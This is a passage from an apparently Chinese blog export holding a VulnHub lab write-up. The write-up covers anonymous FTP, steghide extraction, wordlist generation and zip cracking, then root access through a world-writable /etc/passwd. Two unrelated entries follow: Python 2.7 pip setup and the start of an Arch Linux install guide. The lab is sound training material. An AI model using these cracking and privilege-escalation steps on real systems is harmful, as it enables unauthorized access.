class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ ftp 192.168.56.139<br>Connected to 192.168.56.139.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.56.139:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||15856|)<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0             230 Jan 30  2020 ftp.zip<br>226 Directory send OK.<br>ftp&gt; get ftp.zip<br><span class="hljs-built_in">local</span>: ftp.zip remote: ftp.zip<br>229 Entering Extended Passive Mode (|||12832|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> ftp.zip (230 bytes).<br>100% |***********************************************************************|   230        4.66 MiB/s    00:00 ETA<br>226 Transfer complete.<br>230 bytes received <span class="hljs-keyword">in</span> 00:00 (452.84 KiB/s)<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /<br></code></pre></td></tr></table></figure><p>试一试拿到的提权的口令，提取不出来。在这里卡了许久，尝试对 Web 界面中的图片进行查看，<code>exiftool</code>, <code>strings</code>, <code>binwalk</code>, <code>file</code> 都没有收获。使用 zip2john 转换后再爆破，依然无结果。尝试使用这个口令登录 ssh 和 smb，依然不成功。</p><h2 id="图片隐写信息提取"><a href="#图片隐写信息提取" class="headerlink" title="图片隐写信息提取"></a>图片隐写信息提取</h2><p>这个过程中发现自己对于隐写方面还是不够熟悉，这个靶机最后会增加一个隐写方法和如何识别的概括。这里提示中的提取，也可以是使用隐写工具提取信息的口令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ steghide extract -sf Haryana-1-1.jpg <br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;file.txt&quot;</span>.<br><br><br>┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ <span class="hljs-built_in">cat</span> file.txt <br>      I have found the password <span class="hljs-keyword">for</span> a zip file but i have forgote the last part of it, can you find out<br>     <br>       5AHU**<br></code></pre></td></tr></table></figure><p>发现了解压密码的前四位，看样子接下来是需要我们想办法生成字典再爆破了</p><h2 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h2><p>这里可以使用的生成字典的工具有很多，我尝试过的有：<code>crunch</code>, <code>pydictor.py</code></p><p><a href="https://github.com/LandGrey/pydictor">LandGrey&#x2F;pydictor: A powerful and useful hacker dictionary builder for a brute-force attack (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu/pydictor]<br>└─$ python pydictor.py -char <span class="hljs-string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\!@#$%^&amp;*&quot;</span> --len 2 2 --<span class="hljs-built_in">head</span> 5AHU --output ../dict_py<br>                              _ _      _<br>              _ __  _   _  __| (_) ___| |_ ___  _ __                                                                <br>             | <span class="hljs-string">&#x27;_ \| | | |/ _` | |/ __| __/ _ \| &#x27;</span>__|                                                               <br>             | |_) | |_| | (_| | | (__| || (_) | |                                                                  <br>             | .__/ \__, |\__,_|_|\___|\__\___/|_|                                                                  <br>             |_|    |___/                            2.1.7.3<span class="hljs-comment">#dev                                                    </span><br><br>[+] A total of :4900 lines<br>[+] Store <span class="hljs-keyword">in</span>   :/home/kali/Downloads/sahu/dict_py/char_050009.txt <br>[+] Cost       :0.0417 seconds<br><br></code></pre></td></tr></table></figure><p>其实生成密码也是有一定技巧的，一开始我想找个可以直接指定前缀的密码工具，但是仔细一想，我可以通过 sed 或者 awk 工具将前缀加上去，这样不久把问题简化为生成两位的随机字符或数字</p><h2 id="zip-密码爆破"><a href="#zip-密码爆破" class="headerlink" title="zip 密码爆破"></a>zip 密码爆破</h2><p>使用 fcrackzip 工具来爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ fcrackzip  -D -p dict_py/char_050009.txt -u ftp.zip <br><br><br>PASSWORD FOUND!!!!: pw == 5AHU<span class="hljs-comment">#5</span><br></code></pre></td></tr></table></figure><p>得到了密码。实际上在这里花了很多时间，有一部分原因是我想一劳永逸，找一个最好用最常用的工具用熟练，但事实是每个工具都各有优缺点，与其花时间去找工具，不如去弄清楚自己到底想拿到什么样的一个字典（这里生成的字典的目标很简单，只需要固定前四个字符，然后生成包含大写、字符，小写也可以纳入考虑）</p><p>使用密码 <code>5AHU#5</code> 来解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ <span class="hljs-built_in">cat</span> ftp.txt        <br><br>      USERNAME = sahu<br>      PASSWORD = sahu14216<br></code></pre></td></tr></table></figure><p>使用上述用户名和密码登录 ssh，失败。尝试登录 smb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ smbclient //192.168.56.139/sambashare -U sahu%sahu14216 <br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Jan 30 03:50:23 2020<br>  ..                                  D        0  Thu Jan 30 02:57:06 2020<br>  ssh.txt                             N       64  Thu Jan 30 03:50:02 2020<br><br>                10253588 blocks of size 1024. 4282444 blocks available<br>smb: \&gt; get ssh.txt <br>getting file \ssh.txt of size 64 as ssh.txt (8.9 KiloBytes/sec) (average 8.9 KiloBytes/sec)<br>smb: \&gt;<br></code></pre></td></tr></table></figure><p>拿到了一个 ssh.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ <span class="hljs-built_in">cat</span> ssh.txt <br>   ssh <span class="hljs-built_in">users</span> list<br>   USERNAME = haryana<br>   PASSWORD = hralltime<br></code></pre></td></tr></table></figure><p>尝试使用此用户名和密码登录 ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ ssh haryana@192.168.56.139<br>haryana@192.168.56.139\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-18-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">156 updates can be installed immediately.</span><br><span class="hljs-string">77 of these updates are security updates.</span><br><span class="hljs-string">To see these additional updates run: apt list --upgradable</span><br><span class="hljs-string"></span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Tue Feb  4 18:05:07 2020 from 192.168.43.111</span><br><span class="hljs-string">haryana@sahu-VirtualBox:~$ whoami</span><br><span class="hljs-string">haryana</span><br><span class="hljs-string">haryana@sahu-VirtualBox:~$ id</span><br><span class="hljs-string">uid=1001(haryana) gid=1001(haryana) groups=1001(haryana)</span><br><span class="hljs-string">haryana@sahu-VirtualBox:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:4d:a7:81 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.139/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3</span><br><span class="hljs-string">       valid_lft 502sec preferred_lft 502sec</span><br><span class="hljs-string">    inet6 fe80::853d:613f:7377:f9e7/64 scope link noprefixroute </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">haryana@sahu-VirtualBox:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for haryana: </span><br><span class="hljs-string">Sorry, user haryana may not run sudo on sahu-VirtualBox.</span><br></code></pre></td></tr></table></figure><h2 id="敏感文件查看"><a href="#敏感文件查看" class="headerlink" title="敏感文件查看"></a>敏感文件查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">haryana@sahu-VirtualBox:~$ <span class="hljs-built_in">ls</span> -alih<br>total 40K<br>295542 drwxr-xr-x 6 haryana haryana 4.0K Feb  4  2020 .<br>262147 drwxr-xr-x 4 root    root    4.0K Jan 30  2020 ..<br>268530 -rw------- 1 haryana haryana  179 Feb  4  2020 .bash_history<br>268529 -rw-r--r-- 1 haryana haryana  220 Jan 30  2020 .bash_logout<br>268527 -rw-r--r-- 1 haryana haryana 3.7K Jan 30  2020 .bashrc<br>295605 drwxr-x--- 4 haryana haryana 4.0K Feb  4  2020 .cache<br>295602 drwxr-x--- 4 haryana haryana 4.0K Feb  4  2020 .config<br>295600 drwx------ 3 haryana haryana 4.0K Feb  4  2020 .gnupg<br>295584 drwxrwxr-x 3 haryana haryana 4.0K Jan 30  2020 .<span class="hljs-built_in">local</span><br>262309 -rw-r--r-- 1 haryana haryana  807 Jan 30  2020 .profile<br>haryana@sahu-VirtualBox:~$ <span class="hljs-built_in">cat</span> .bash_history<br><span class="hljs-built_in">cd</span> sahu<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> sambashare/<br><span class="hljs-built_in">ls</span><br>nano /etc/passwd<br>su sahu<br><span class="hljs-built_in">cd</span> ..<br><span class="hljs-built_in">cd</span> sahu<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> ..<br>su sahu<br><span class="hljs-built_in">cd</span><br><span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> sahu/<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> ../..<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> root/<br>sudo <span class="hljs-built_in">cd</span> root<br>su sahu<br><span class="hljs-built_in">cd</span> /etc/<br><span class="hljs-built_in">ls</span> -l<br>su sahu<br></code></pre></td></tr></table></figure><h2 id="passwd-写入提权"><a href="#passwd-写入提权" class="headerlink" title="passwd 写入提权"></a>passwd 写入提权</h2><p>查看敏感文件发现用户似乎编辑过 passwd 文件，查看 passwd 文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">haryana@sahu-VirtualBox:~$ <span class="hljs-built_in">ls</span> -liah /etc/passwd<br>163753 -rwxrwxrwx 1 root root 2.9K Jan 30  2020 /etc/passwd<br>haryana@sahu-VirtualBox:~$ nano /etc/passwd<br></code></pre></td></tr></table></figure><p>写入 passwd 提权尝试，先在本机生成哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ openssl passwd passwd123            <br>$1$lz2D4Jlh<span class="hljs-variable">$P827XXbXI15iGa9pxqcf</span>/0<br></code></pre></td></tr></table></figure><p>替换掉 passwd 中 root 用户那一行代表密码的 x 字母</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">haryana@sahu-VirtualBox:~$ nano /etc/passwd<br>haryana@sahu-VirtualBox:~$ su root<br>Password: <br>root@sahu-VirtualBox:/home/haryana<span class="hljs-comment"># cd /root</span><br>root@sahu-VirtualBox:~<span class="hljs-comment"># ls -liah</span><br>total 32K<br>524291 drwx------  4 root root 4.0K Jan 30  2020 .<br>     2 drwxr-xr-x 20 root root 4.0K Jan 29  2020 ..<br>524308 -rw-------  1 root root 1.5K Feb  4  2020 .bash_history<br>524306 -rw-r--r--  1 root root 3.1K Aug 28  2019 .bashrc<br>524305 drwx------  2 root root 4.0K Oct 17  2019 .cache<br>557482 drwxr-xr-x  3 root root 4.0K Jan 30  2020 .<span class="hljs-built_in">local</span><br>524307 -rw-r--r--  1 root root  148 Aug 28  2019 .profile<br>524338 -rw-r--r--  1 root root  123 Jan 30  2020 root.txt<br>root@sahu-VirtualBox:~<span class="hljs-comment"># cat root.txt</span><br>   GREATE YOU FINISH THIS TASK<br>                               CONGRATS!!!!!!!!!!!!<br>     TELL ME ON TWITTER  @VivekGautam09<br></code></pre></td></tr></table></figure><h2 id="jpg-图片信息隐藏小结"><a href="#jpg-图片信息隐藏小结" class="headerlink" title="jpg 图片信息隐藏小结"></a>jpg 图片信息隐藏小结</h2><p>这里并不对原理做过多解释，而是着重于判断和工具利用</p><h3 id="exif-信息"><a href="#exif-信息" class="headerlink" title="exif 信息"></a>exif 信息</h3><p><code>exiftool</code> 工具主要针对图片信息中的 Exif 数据区，这部分通常保存有拍摄相关信息和 comment 信息，符合 JPEG 标准</p><p>可编辑 Exit 信息的工具：MagicEXIF</p><h3 id="图片隐写方法"><a href="#图片隐写方法" class="headerlink" title="图片隐写方法"></a>图片隐写方法</h3><p>常见的隐写方法包括 DCT 加密、LSB 加密、DCT LSB、Average DCT、High Capacity DCT、High Capacity DCT - Algorithm</p><p>常见的隐写工具包括：JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX、Camouflage</p><h3 id="图片隐写检测工具"><a href="#图片隐写检测工具" class="headerlink" title="图片隐写检测工具"></a>图片隐写检测工具</h3><p>常用的检测工具：</p><ul><li>stegdetect <ul><li>安装方法：我是通过安装 deb 包再通过 <code>apt --fix-broken install</code> 自动解决了依赖问题，deb 包的网址 <a href="http://old-releases.ubuntu.com/ubuntu/pool/universe/s/stegdetect/">http://old-releases.ubuntu.com/ubuntu/pool/universe/s/stegdetect/</a></li><li>可能还需要下载配置文件，不过运行似乎还是有问题 <code>wget https://github.com/poizan42/stegdetect/blob/46a09e93320cd63b6731e0bc5b22c11c588a0e81/rules.ini</code></li><li>建议 Windows 上使用得了</li></ul></li></ul><p><img src="/pic/5de82a69e234cfe48b2344e8bb605beb_MD5.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">-s 修改检测算法的敏感度，该值的默认值为<span class="hljs-number">1</span>。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大<br>t – 设置要检测哪些隐写工具（默认检测<span class="hljs-keyword">jopi），可设置的选项如下：</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">j </span>– 检测图像中的信息是否是用<span class="hljs-keyword">jsteg嵌入的。</span><br><span class="hljs-keyword"></span>o – 检测图像中的信息是否是用outguess嵌入的。<br>p – 检测图像中的信息是否是用<span class="hljs-keyword">jphide嵌入的。</span><br><span class="hljs-keyword"></span>i – 检测图像中的信息是否是用invisible secrets嵌入的。<br></code></pre></td></tr></table></figure><ul><li>steghide 可以设置密码<ul><li>常用的爆破工具 <a href="https://github.com/Va5c0/Steghide-Brute-Force-Tool">https://github.com/Va5c0/Steghide-Brute-Force-Tool</a><ul><li><code>python steg_brute.py -b -d [字典] -f [jpg_file]</code></li><li>需要安装库 progressbar2，因为是 python2 的工具，需要先为 python2安装 pip，参见 [[..&#x2F;technique&#x2F;zheteng&#x2F;Python2.7 install pip|Python2.7 install pip]]</li><li>StegBrute 的运行必须依赖于 Steghide</li></ul></li><li>stegseek 比 stebrute 的速度更快</li><li><code>steghide info</code></li><li><code>steghide -sf filename</code></li></ul></li><li>F5 隐写 <a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a><ul><li><code>java Extract 1.jpg -p 123456</code></li></ul></li><li>outguess是一种通用的隐写工具，允许插入隐藏信息到数据源的冗余位中。 <a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a><ul><li><code>./configure &amp;&amp; make &amp;&amp; make install</code></li><li><code>outguess -k &quot;my secret key&quot; -d hidden.txt demo.jpg out.jpg</code></li></ul></li><li>stegsolve 逐层看是否有图像隐藏</li><li>binwalk 提取文件</li><li>zsteg 可以作为 binwalk 的补充工具<ul><li>安装需要有 ruby 环境</li></ul></li></ul><p>其实还有些别的技巧，比如调整图片大小等等，以后有机会再填坑</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://byy3.com/1072.html">隐写术之stegdeteck，F5，zsteg，outguess，stregcracker,stregseek,steghide,Beyond Compare，-泓源视野 (byy3.com)</a></p><p>这篇文章不错，可惜图挂了，其中提到的 kali 上安装 stegdetect 方法链接我尝试了没成功，不确定是不是我的问题，有时间的话可以折腾折腾</p><p><a href="http://old-releases.ubuntu.com/ubuntu/pool/universe/s/stegdetect/">http://old-releases.ubuntu.com/ubuntu/pool/universe/s/stegdetect/</a></p><p>stegdetect 工具 deb 包链接</p><p><a href="https://3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8JPEG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8Fpayload">隐写技巧——利用JPEG文件格式隐藏payload (3gstudent.github.io)</a></p><p>给初学者当背景知识补充很不错</p><p><a href="https://hitcxy.com/2020/misc-tools/">misc_tools | pikachu’s Blog (hitcxy.com)</a></p><p>包含了很多 misc 工具，不只有图片隐写工具</p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9387711.html">破解Zip加密文件常用的几种方法 - Angel_Kitty - 博客园 (cnblogs.com)</a></p><p>zip 加密文件的一些处理方法</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python2.7 install pip</title>
    <link href="/2023/09/ea477c3a54b7.html"/>
    <url>/2023/09/ea477c3a54b7.html</url>
    
    <content type="html"><![CDATA[<h1 id="Python2-7-install-pip"><a href="#Python2-7-install-pip" class="headerlink" title="Python2.7 install pip"></a>Python2.7 install pip</h1><p>问题背景：<code>steghide</code> 本身并不支持爆破，需要一些其他的方法 <a href="https://github.com/Va5c0/Steghide-Brute-Force-Tool">https://github.com/Va5c0/Steghide-Brute-Force-Tool</a> ，这个脚本需要安装库 progressbar（使用的是 python2）</p><p>默认 pip 指向的是 python3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/usr/lib/python2.7/dist-packages/pip-23.1.2]<br>└─$ pip -V<br>pip 23.2.1 from /home/kali/.local/lib/python3.11/site-packages/pip (python 3.11)<br></code></pre></td></tr></table></figure><p>如何为 python2.7 安装 pip 成了一个问题，尝试搜索得到的答案是 python2.7 已经不在维护，kali 中也删去了 python2.7 的 pip</p><p>解决方案：</p><p><a href="https://forums.kali.org/showthread.php?48570-New-Kali-build-cannot-install-pip-for-python2-7">New Kali build cannot install pip for python2.7</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py  -o py2-get-pip.py<br><br>┌──(kali㉿kali)-[~]<br>└─$ python2 py2-get-pip.py <br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                              </span><br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting pip&lt;21.0<br>  Downloading pip-20.3.4-py2.py3-none-any.whl (1.5 MB)<br>     |████████████████████████████████| 1.5 MB 686 kB/s <br>Collecting wheel<br>  Downloading wheel-0.37.1-py2.py3-none-any.whl (35 kB)<br>Installing collected packages: pip, wheel<br>  WARNING: The scripts pip, pip2 and pip2.7 are installed <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/home/kali/.local/bin&#x27;</span> <span class="hljs-built_in">which</span> is not on PATH.<br>  Consider adding this directory to PATH or, <span class="hljs-keyword">if</span> you prefer to suppress this warning, use --no-warn-script-location. <br>  WARNING: The script wheel is installed <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/home/kali/.local/bin&#x27;</span> <span class="hljs-built_in">which</span> is not on PATH.<br>  Consider adding this directory to PATH or, <span class="hljs-keyword">if</span> you prefer to suppress this warning, use --no-warn-script-location. <br>Successfully installed pip-20.3.4 wheel-0.37.1<br><br>┌──(kali㉿kali)-[~]<br>└─$ python2 -m pip install --user --upgrade progressbar2<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                              </span><br>Collecting progressbar2<br>  Downloading progressbar2-3.55.0-py2.py3-none-any.whl (26 kB)<br>Collecting six<br>  Using cached six-1.16.0-py2.py3-none-any.whl (11 kB)<br>Collecting python-utils&gt;=2.3.0<br>  Downloading python_utils-2.7.1-py2.py3-none-any.whl (14 kB)<br>Installing collected packages: six, python-utils, progressbar2<br>Successfully installed progressbar2-3.55.0 python-utils-2.7.1 six-1.16.0<br>WARNING: You are using pip version 20.3.4; however, version 23.2.1 is available.<br>You should consider upgrading via the <span class="hljs-string">&#x27;/usr/bin/python2 -m pip install --upgrade pip&#x27;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>zheteng</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch Linux In Lenovo 小新 14Pro AMD</title>
    <link href="/2023/09/30c532bdcf1f.html"/>
    <url>/2023/09/30c532bdcf1f.html</url>
    
    <content type="html"><![CDATA[<h1 id="Arch-Linux-In-Lenovo-小新-14-Pro-AMD"><a href="#Arch-Linux-In-Lenovo-小新-14-Pro-AMD" class="headerlink" title="Arch Linux In Lenovo 小新 14 Pro AMD"></a>Arch Linux In Lenovo 小新 14 Pro AMD</h1><h2 id="为什么要选择-Arch-Linux？"><a href="#为什么要选择-Arch-Linux？" class="headerlink" title="为什么要选择 Arch Linux？"></a>为什么要选择 Arch Linux？</h2><p>有一定的跟风成分，在公众号看到了苑房弘老师在迁移到 Arch Linux 上，从视觉效果上我觉得尝试一下 Arch Linux，后续折腾虚拟机安装，但是在使用 Hyprland 时总是出现问题（第一天折腾）。刚好朋友也在重装系统，交流的时候，他顺口说了句我的空闲笔记本装 Linux 或许才是最佳选择，第二天就打算尝试用 Lenovo 小新 14 Pro AMD 版来直接单系统 Arch Linux。以下是我在搜集资料的过程中遇到的很有帮助的连接</p><ul><li><a href="https://arch.icekylin.online/">archlinux 简明指南 | archlinux 简明指南 (icekylin.online)</a><ul><li>专注于技术，和谐了一部分内容，添加了大量安装的过程中的截图，增加了部分参数和命令的解释以及关于某些错误的处理方法，便于理解和操作</li><li>按照文档中的安装过程逐步安装就行（安装前的准备也要看），如果不需要 Hyprland 的话，基本无坑，想要使用 Hyprland 的话需要参考下一个链接里的说明</li><li>输入法的问题可以参考第三个链接</li><li>AMD 集显也需要参考此链接</li></ul></li><li><a href="https://www.youtube.com/watch?v=mbQd0bJQ6a8">Hyprland on Arch Linux v3 - Nvida, Amd and Intel GPU support - YouTube</a><ul><li>安装 Hyprland 的脚本，作者在维护和更新，也可以在 discord 上和作者进行沟通交流</li><li>如果想使用这个脚本的话，请注意不要按照上一个教程中那样配置 archlinuxcn，安装过程中可能会遇到许多关于签名的问题，导入信任密钥后可能会遭遇另一些问题</li><li>脚本运行后如果有软件安装失败，可以使用 yay 手动安装（建议参考作者在 GitHub 中的 README 文档）</li><li>如果登录成功后桌面是黑色的，可能是集显驱动没装，参考第一个链接</li><li>作者的壁纸可以在他 GitHub 发布的 v2.1 中找到</li><li>常用快捷键汇总（建议 Win + H 